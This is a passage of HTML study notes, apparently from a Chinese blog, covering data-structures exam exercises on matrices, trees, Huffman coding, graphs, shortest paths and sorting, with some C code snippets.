2000= 9174         列：（67 * 50 +44） * 2 + 2000 = 8788</strong></p><p>18、n阶对称矩阵a满足a[i][j]=a[j][i],i,j=1..n,，用一维数组t[1..m]存储(按行向存储左下三角)时，t的长度为<strong><em>n(n+1)/2</em></strong>， 当</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20201226142157850.png" alt="image-20201226142157850" loading="lazy"></p><p>设矩阵A= <img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps4.png" alt="img" loading="lazy"></p><p>（1）若将A视为对称矩阵，画出对其压缩存储的存储表；</p><p>（2）若将A视为稀疏矩阵，画出其三元表形式压缩存储表；</p><p>（3）若将A视为稀疏矩阵，画出A的十字链表结构。</p><p>（1）</p><table><thead><tr><th>2</th><th>0</th><th>0</th><th>0</th><th>3</th><th>0</th><th>4</th><th>0</th><th>0</th><th>0</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>（2）</p><table><thead><tr><th>i</th><th>1</th><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead><tbody><tr><td>j</td><td>1</td><td>4</td><td>3</td><td>2</td><td>1</td></tr><tr><td>v</td><td>2</td><td>4</td><td>3</td><td>3</td><td>4</td></tr></tbody></table><p>（3）</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps6.png" alt="img" loading="lazy"></p><p>24、已知广义表A=(9，7，(8，10，(99))，12)，试用求表头和表尾的操作Head( )和Tail( )将原子元素99从A中取出来。</p><p>答：Head(Head(Tail(Tail(Head(Tail(Tail(A)))))))。</p><p><strong>head取头，返回单个元素(不带括号)，tail取尾（除头取的元素以外的其他元素），返回集合元素（带括号）</strong></p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20201226143828172.png" alt="image-20201226143828172" loading="lazy"></p><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><h4 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h4><p>取一块连续的内存空间，在存储每个结点的同时，各自都附加一个记录其父结点位置的变量。</p><p>在树结构中，除了树根外，每个结点都只有一个父结点（又叫“双亲结点”）。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2-1FS015503O53.png" alt="img" loading="lazy"></p><h4 id="孩子表示法（邻接表）"><a href="#孩子表示法（邻接表）" class="headerlink" title="孩子表示法（邻接表）"></a>孩子表示法（邻接表）</h4><p>将树中的每个结点的孩子结点排列成一个线性表，用链表存储起来。对于含有 n 个结点的树来说，就会有 n 个单链表，将 n 个单链表的头指针存储在一个线性表中，这样的表示方法就是孩子表示法。</p><blockquote><p>如果结点没有孩子（例如叶子结点），那么它的单链表为空表。</p></blockquote><p>例如，使用孩子表示法存储图 1 （A），存储效果如图 2：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2-1FS0155F5a9.png" alt="img" loading="lazy"></p><p>图 2 孩子表示法</p><p>使用孩子表示法存储的树结构，正好和双亲表示法相反，适用于查找某结点的孩子结点，不适用于查找其父结点。可以将两种表示方法合二为一，存储效果如图 3：</p><h4 id="孩子兄弟表示法（二叉链）"><a href="#孩子兄弟表示法（二叉链）" class="headerlink" title="孩子兄弟表示法（二叉链）"></a>孩子兄弟表示法（二叉链）</h4><p>使用链式存储结构存储普通树。链表中每个结点由 3 部分组成：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2-1FS0155TD42.png" alt="img" loading="lazy"></p><p>图 4 结点构成</p><p>其中孩子指针域，表示指向当前结点的第一个孩子结点，兄弟结点表示指向当前结点的下一个兄弟结点。</p><p>通过孩子兄弟表示法，普通树转化为了二叉树，所以孩子兄弟表示法又被称为“二叉树表示法”或者“二叉链表表示法”。</p><p>例如，用孩子兄弟表示法表示图 1 （A）的普通树，存储结果为：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2-1FS0160020200.png" alt="img" loading="lazy"></p><p>1、已知一棵度为3的树有2个度为1的结点，3个度为2的结点，4个度为3的结点，则该树有<strong>__</strong><strong>12</strong>__个叶结点。</p><p><strong>B:边数，N：结点数</strong></p><p><strong>n=b+1    n=n0+n1+n2+n3=n1+2<em>n2+3 <em>n3+1→ n=n2+2 <em>n3+1</em></em>        **3+2</em>4+1</strong></p><p>6、已知一棵二叉树的中序序列是DBEAFIHCG，后序序列是DEBHIFGCA，画出这棵二叉树。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps7.png" alt="img" loading="lazy"></p><p>中缀式a+b<em>3+4</em>(c-d)对应的前缀式为________，若a=1, b=2, c=3, d=4，则后缀式db/cc<em>a-b</em>+的运算结果为________。</p><p>14、设一棵二叉树的前序遍历序列为ABDFCEGH，中序遍历序列为BFDAGEHC</p><p>(1)画出这棵二叉树。</p><p>(2)画出这棵二叉树的后序线索树。</p><p>(3)将这棵二叉树转换成对应的树（或森林)</p><p><strong>线索树先写出序列，无左孩子就指向前驱，无右孩子就指向后继</strong></p><p>FDBGHECA</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps14-1608971064985.png" alt="img" loading="lazy"></p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps15-1608971064986.png" alt="img" loading="lazy">                <img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps16-1608971064986.png" alt="img" loading="lazy"></p><p>15、将下列由三棵树组成的森林转换为二叉树。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps17-1608971064986.png" alt="img" loading="lazy"></p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps18-1608971064986.png" alt="img" loading="lazy"></p><h4 id="树转换二叉树"><a href="#树转换二叉树" class="headerlink" title="树转换二叉树"></a><strong>树转换二叉树</strong></h4><p>（1）加线。在所有兄弟结点之间加一条连线。</p><p>（2）去线。树中的每个结点，只保留它与第一个孩子结点的连线，删除它与其它孩子结点之间的连线。</p><p>（3）层次调整。以树的根节点为轴心，将整棵树顺时针旋转一定角度，使之结构层次分明。（注意第一个孩子是结点的左孩子，兄弟转换过来的孩子是结点的右孩子）</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2012110416594150.jpg" alt="img" loading="lazy"></p><p>口诀：兄弟相连，长兄为父，孩子靠左。</p><p>核心：左孩子，右兄弟          </p><h4 id="森林转换二叉树"><a href="#森林转换二叉树" class="headerlink" title="森林转换二叉树"></a>森林转换二叉树</h4><p>（1）把每棵树转换为二叉树。</p><p>（2）第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树的根结点的右子树，用线连接起来。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2012110417004247.jpg" alt="img" loading="lazy"></p><h4 id="二叉树转树"><a href="#二叉树转树" class="headerlink" title="二叉树转树"></a><strong>二叉树转树</strong></h4><p>是树转换为二叉树的逆过程。还原结点A的孩子，结点A的左孩子开始，一直向右走，这些结点就是结点A的孩子，遇见顺序就是它们作为结点A孩子的顺序。</p><p>（1）加线。若某结点X的左孩子结点存在，则将这个左孩子的右孩子结点、右孩子的右孩子结点、右孩子的右孩子的右孩子结点…，都作为结点X的孩子。将结点X与这些右孩子结点用线连接起来。</p><p>（2）去线。删除原二叉树中所有结点与其右孩子结点的连线。</p><p>（3）层次调整。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2012110417011138.jpg" alt="img" loading="lazy"></p><h4 id="二叉树转森林"><a href="#二叉树转森林" class="headerlink" title="二叉树转森林"></a><strong>二叉树转森林</strong></h4><p>假如一棵二叉树的根结点有右孩子，则这棵二叉树能够转换为森林，否则将转换为一棵树。在二叉树种A有右子树上向右的一连串结点都是A的兄弟，那么就把兄弟分离，A的每个兄弟结点作为森林中树的根结点。</p><p>（1）从根结点开始，若右孩子存在，则把与右孩子结点的连线删除。再查看分离后的二叉树，若其根结点的右孩子存在，则连线删除…。直到所有这些根结点与右孩子的连线都删除为止。</p><p>（2）将每棵分离后的二叉树转换为树。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/2012110417014911.jpg" alt="img" loading="lazy"></p><p><strong>哈夫曼树编码，左0右1</strong></p><h4 id="哈夫曼树HT的存储结构的初态和终态"><a href="#哈夫曼树HT的存储结构的初态和终态" class="headerlink" title="哈夫曼树HT的存储结构的初态和终态"></a>哈夫曼树HT的存储结构的初态和终态</h4><p>18、已知下列字符A、B、C、D、E、F、G的权值分别为3、12、7、4、2、8、11，试填写出其对应哈夫曼树HT的存储结构的初态和终态。</p><p>表18-1  HT初态</p><table><thead><tr><th>下标值</th><th>数据域</th><th>weight</th><th>parent</th><th>lchild</th><th>rchild</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>3</td><td>0</td><td>0</td><td>0</td></tr><tr><td>2</td><td>B</td><td>12</td><td>0</td><td>0</td><td>0</td></tr><tr><td>3</td><td>C</td><td>7</td><td>0</td><td>0</td><td>0</td></tr><tr><td>4</td><td>D</td><td>4</td><td>0</td><td>0</td><td>0</td></tr><tr><td>5</td><td>E</td><td>2</td><td>0</td><td>0</td><td>0</td></tr><tr><td>6</td><td>F</td><td>8</td><td>0</td><td>0</td><td>0</td></tr><tr><td>7</td><td>G</td><td>11</td><td>0</td><td>0</td><td>0</td></tr><tr><td>8</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>9</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>10</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>11</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>12</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>13</td><td></td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p>表18-2  HT终态（书上的结果）</p><table><thead><tr><th>下标值</th><th>数据域</th><th>weight</th><th>parent</th><th>lchild</th><th>rchild</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>3</td><td>8</td><td>0</td><td>0</td></tr><tr><td>2</td><td>B</td><td>12</td><td>12</td><td>0</td><td>0</td></tr><tr><td>3</td><td>C</td><td>7</td><td>10</td><td>0</td><td>0</td></tr><tr><td>4</td><td>D</td><td>4</td><td>9</td><td>0</td><td>0</td></tr><tr><td>5</td><td>E</td><td>2</td><td>8</td><td>0</td><td>0</td></tr><tr><td>6</td><td>F</td><td>8</td><td>10</td><td>0</td><td>0</td></tr><tr><td>7</td><td>G</td><td>11</td><td>11</td><td>0</td><td>0</td></tr><tr><td>8</td><td></td><td>5</td><td>9</td><td>1</td><td>5</td></tr><tr><td>9</td><td></td><td>9</td><td>11</td><td>4</td><td>8</td></tr><tr><td>10</td><td></td><td>15</td><td>12</td><td>3</td><td>6</td></tr><tr><td>11</td><td></td><td>20</td><td>13</td><td>7</td><td>9</td></tr><tr><td>12</td><td></td><td>27</td><td>13</td><td>2</td><td>10</td></tr><tr><td>13</td><td></td><td>47</td><td>0</td><td>11</td><td>12</td></tr></tbody></table><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps3.png" alt="img" loading="lazy"></p><h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><p>7、在图G的邻接表表示中，每个顶点邻接表中所含的结点数（即该顶点的链表结点），对于无向图来说等于该顶点的<strong><em>度</em></strong>；对于有向图来说等于该顶点的<strong><em>出度</em></strong>。</p><p>8、在有向图的邻接矩阵表示中，计算第I个顶点入度的方法是<strong><em>第I列非零元的个数</em></strong>。</p><h4 id="图的邻接矩阵和邻接表"><a href="#图的邻接矩阵和邻接表" class="headerlink" title="图的邻接矩阵和邻接表"></a>图的邻接矩阵和邻接表</h4><p>9、请用邻接矩阵和邻接表表示法画出下图G的存储结构。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps10.png" alt="img" loading="lazy"></p><p>邻接矩阵：<img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps11.png" alt="img" loading="lazy"></p><p>邻接表：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps12.png" alt="img" loading="lazy"></p><h4 id="深度优先遍历-DFS-和广度优先遍历-BFS"><a href="#深度优先遍历-DFS-和广度优先遍历-BFS" class="headerlink" title="深度优先遍历(DFS)和广度优先遍历(BFS)"></a>深度优先遍历(DFS)和广度优先遍历(BFS)</h4><p><strong>深度优先遍历(DFS)</strong>　<strong>在此我想用一句话来形容 “不到南墙不回头”。</strong></p><p>11、下面的邻接表表示一个给定的无向图，给出从顶点v4开始，对图用深度优先搜索法进行遍历时的顶点序列<strong><em>v4, v2, v1, v3, v5, v6</em></strong>；给出从顶点v4开始，对图用广度优先搜索法进行遍历时的顶点序列<strong><em>v4, v2, v3, v6, v1, v5</em></strong>。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps17-1609049024682.png" alt="img" loading="lazy"></p><p>图示为：<img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps18-1609049024683.png" alt="img" loading="lazy"></p><p>12、给出下图G：</p><p>（1）画出G的邻接表表示图；</p><p>（2）根据你画出的邻接表，以顶点1为根，画出G的深度优先生成树和广度优先生成树。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps31.png" alt="img" loading="lazy"></p><p>（1）邻接表表示图</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps32.png" alt="img" loading="lazy"></p><p>（2）深度优先生成树为：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps33.png" alt="img" loading="lazy"></p><p>广度优先生成树为：</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps34.png" alt="img" loading="lazy"></p><h4 id="最小生成树（普里姆算法和克鲁斯卡尔算法）"><a href="#最小生成树（普里姆算法和克鲁斯卡尔算法）" class="headerlink" title="最小生成树（普里姆算法和克鲁斯卡尔算法）"></a>最小生成树（普里姆算法和克鲁斯卡尔算法）</h4><p>13、<strong>Prim（普里姆）算法</strong>适用于求<strong><em>稠密图</em></strong>的网的最小生成树；<strong>Kruskal（克鲁斯卡尔）算法</strong>适用于求<strong><em>稀疏图</em></strong>的网的最小生成树。</p><p><strong>Prim（普里姆）算法：从某点出发遍历周围最小权值的边，直到遍历完所有点，边连线不能形成环</strong></p><p><strong>Kruskal（克鲁斯卡尔）算法：从权值最小的边开始，一直遍历最小权值的边，直到遍历完所有点，边连线不能形成环</strong></p><p>16、在拓扑分类中，拓扑序列的最后一个顶点必定是_<strong>出度为0</strong>_的顶点。</p><p><strong>拓扑排列，从出度为零的点开始选择</strong></p><h4 id="最短路径（过程）"><a href="#最短路径（过程）" class="headerlink" title="最短路径（过程）"></a>最短路径（过程）</h4><p>17、已知一图如下图所示：</p><p>（1）写出该图的两个拓扑排序（升序、降序）；</p><p>（2）以1为源点，4为终点，给出所有事件允许发生的最早时间和最晚时间，并给出关键路径；</p><p>（3）求顶点1到其余各顶点的最短路径。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps35.png" alt="img" loading="lazy"></p><p>（1）拓扑排序升序：1, 5, 6, 2, 7, 3, 8, 4；降序：1, 5, 6, 7, 8, 2, 3, 4</p><p>（2）关键路径</p><table><thead><tr><th>顶点</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>Ve</td><td>0</td><td>30</td><td>50</td><td>65</td><td>10</td><td>17</td><td>25</td><td>35</td></tr><tr><td>Vl</td><td>0</td><td>30</td><td>50</td><td>65</td><td>15</td><td>27</td><td>44</td><td>59</td></tr></tbody></table><p>关键路径为1, 2, 3, 4</p><p><strong>（3）最短路径：</strong></p><table><thead><tr><th>顶点集</th><th>D[2]</th><th>D[3]</th><th>D[4]</th><th>D[5]</th><th>D[6]</th><th>D[7]</th><th>D[8]</th><th>P[2]</th><th>P[3]</th><th>P[4]</th><th>P[5]</th><th>P[6]</th><th>P[7]</th><th>P[8]</th></tr></thead><tbody><tr><td>1</td><td>30</td><td>-1</td><td>60</td><td>10</td><td>-1</td><td>-1</td><td>-1</td><td>1</td><td>-1</td><td>1</td><td>1</td><td>-1</td><td>-1</td><td>-1</td></tr><tr><td>1,5</td><td>25</td><td>-1</td><td>60</td><td></td><td>17</td><td>-1</td><td>-1</td><td>5</td><td>-1</td><td>1</td><td></td><td>5</td><td>-1</td><td>-1</td></tr><tr><td>1,5,6</td><td>20</td><td>33</td><td>60</td><td></td><td></td><td>25</td><td>-1</td><td>6</td><td>6</td><td>1</td><td></td><td></td><td>6</td><td>-1</td></tr><tr><td>1,5,6,2</td><td></td><td>33</td><td>60</td><td></td><td></td><td>25</td><td>-1</td><td></td><td>6</td><td>1</td><td></td><td></td><td>6</td><td>-1</td></tr><tr><td>1,5,6,2,7</td><td></td><td>31</td><td>28</td><td></td><td></td><td></td><td>35</td><td></td><td>7</td><td>7</td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4</td><td></td><td>31</td><td></td><td></td><td></td><td></td><td>35</td><td></td><td>7</td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4,3</td><td></td><td></td><td></td><td></td><td></td><td></td><td>35</td><td></td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>1,5,6,2,7,4,3,8</td><td>20</td><td>31</td><td>28</td><td>10</td><td>17</td><td>25</td><td>35</td><td>6</td><td>7</td><td>7</td><td>1</td><td>5</td><td>6</td><td>7</td></tr></tbody></table><p>注：1、表中未填项即是其上面那一项，因为已经找到了最短路径，故相应数组元素不再再修改；</p><p>2、未列D[1]和P[1]，值均为0，自己到自己。</p><p>18、已知一图如下图所示：</p><p>（1）写出该图的两个拓扑排序（升序、降序）；</p><p>（2）以0为源点，11为终点，计算出所有事件和活动的最早发生时间和最晚发生时间，并给出关键路径；</p><p>（3）求顶点1到其余各顶点的<strong>最短路径</strong>。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/wps36.png" alt="img" loading="lazy"></p><p>（1）拓扑排序升序：0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11；降序：0, 3, 4, 8, 2, 7, 10, 1, 5, 6, 9, 11</p><p>（2）关键路径</p><table><thead><tr><th>顶点</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody><tr><td>Ve</td><td>0</td><td>2</td><td>2</td><td>4</td><td>9</td><td>5</td><td>9</td><td>7</td><td>12</td><td>13</td><td>13</td><td>20</td></tr><tr><td>Vl</td><td>0</td><td>4</td><td>2</td><td>5</td><td>10</td><td>7</td><td>9</td><td>9</td><td>13</td><td>13</td><td>14</td><td>20</td></tr></tbody></table><p>关键事件：0, 2, 6, 9, 11</p><table><thead><tr><th></th><th>a1</th><th>a2</th><th>a3</th><th>a4</th><th>a5</th><th>a6</th><th>a7</th><th>a8</th><th>a9</th><th>a10</th><th>a11</th><th>a12</th><th>a13</th><th>a14</th><th>a15</th><th>a16</th></tr></thead><tbody><tr><td>Ee</td><td>0</td><td>0</td><td>0</td><td>2</td><td>2</td><td>2</td><td>4</td><td>4</td><td>9</td><td>5</td><td>9</td><td>7</td><td>7</td><td>12</td><td>13</td><td>13</td></tr><tr><td>El</td><td>2</td><td>0</td><td>1</td><td>4</td><td>2</td><td>4</td><td>5</td><td>6</td><td>10</td><td>7</td><td>9</td><td>9</td><td>11</td><td>13</td><td>13</td><td>14</td></tr></tbody></table><p>关键活动为：a2, a5, a11, a15</p><p>故关键路径为：0, 2, 6, 9, 11</p><p><strong>（3）最短路径</strong></p><table><thead><tr><th>顶点集</th><th>0</th><th>0,1</th><th>0,1,2</th><th>0,1,2,3</th><th>0,1,2,3, 5</th><th>0,1,2,3, 5,6</th><th>0,1,2,3, 5,6,7</th><th>0,1,2,3, 5,6,7,4</th><th>0,1,2,3, 5,6,7,4, 10</th><th>0,1,2,3, 5,6,7,4, 10,9</th><th>0,1,2,3, 5,6,7,4, 10,9,8</th><th>0,1,2,3, 5,6,7,4, 10,9,8,11</th></tr></thead><tbody><tr><td>D[1]</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>D[2]</td><td>2</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>D[3]</td><td>4</td><td>4</td><td>4</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>4</td></tr><tr><td>D[4]</td><td>-1</td><td>-1</td><td>-1</td><td>9</td><td>9</td><td>9</td><td>9</td><td></td><td></td><td></td><td></td><td>9</td></tr><tr><td>D[5]</td><td>-1</td><td>5</td><td>5</td><td>5</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>5</td></tr><tr><td>D[6]</td><td>-1</td><td>-1</td><td>9</td><td>9</td><td>7</td><td></td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>D[7]</td><td>-1</td><td>-1</td><td>7</td><td>7</td><td>7</td><td>7</td><td></td><td></td><td></td><td></td><td></td><td>7</td></tr><tr><td>D[8]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>12</td><td>12</td><td>12</td><td></td><td>12</td></tr><tr><td>D[9]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>11</td><td>11</td><td>11</td><td>11</td><td></td><td></td><td>11</td></tr><tr><td>D[10]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>10</td><td>10</td><td></td><td></td><td></td><td>10</td></tr><tr><td>D[11]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>16</td><td>16</td><td>16</td><td>16</td></tr><tr><td>P[1]</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[2]</td><td>0</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[3]</td><td>0</td><td>0</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0</td></tr><tr><td>P[4]</td><td>-1</td><td>-1</td><td>-1</td><td>3</td><td>3</td><td>3</td><td>3</td><td></td><td></td><td></td><td></td><td>3</td></tr><tr><td>P[5]</td><td>-1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1</td></tr><tr><td>P[6]</td><td>-1</td><td>-1</td><td>2</td><td>2</td><td>5</td><td></td><td></td><td></td><td></td><td></td><td></td><td>5</td></tr><tr><td>P[7]</td><td>-1</td><td>-1</td><td>2</td><td>2</td><td>2</td><td>2</td><td></td><td></td><td></td><td></td><td></td><td>2</td></tr><tr><td>P[8]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>4</td><td>4</td><td>4</td><td></td><td>4</td></tr><tr><td>P[9]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>6</td><td>6</td><td>6</td><td>6</td><td></td><td></td><td>6</td></tr><tr><td>P[10]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>7</td><td>7</td><td></td><td></td><td></td><td>7</td></tr><tr><td>P[11]</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>10</td><td>10</td><td>10</td><td>10</td></tr></tbody></table><p>注：本表是纵向计算，与书上相同。</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image.png" alt="image" loading="lazy"></p><p>1.希尔排序：选择增量，并排序，比如5,2,1         基数排序：使用队列，从最低位起，按关键字的不同值将序列中的记录分配到RADIX个队列中</p><p>2.<strong>选择排序</strong>和<strong>归并排序</strong>不受关键字<strong>个数</strong>影响</p><p>3.稳定算法：<strong>直接插入，冒泡，归并和基数</strong> 排序</p><p><strong>直接插入排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//核心代码</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>temp<span class="token punctuation">)</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">else</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>冒泡排序：即沉底或者冒头</strong></p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20201227151453700.png" alt="image-20201227151453700" loading="lazy"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择排序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>temp<span class="token operator">=</span>a<span class="token punctuation">[</span>j<span class="token 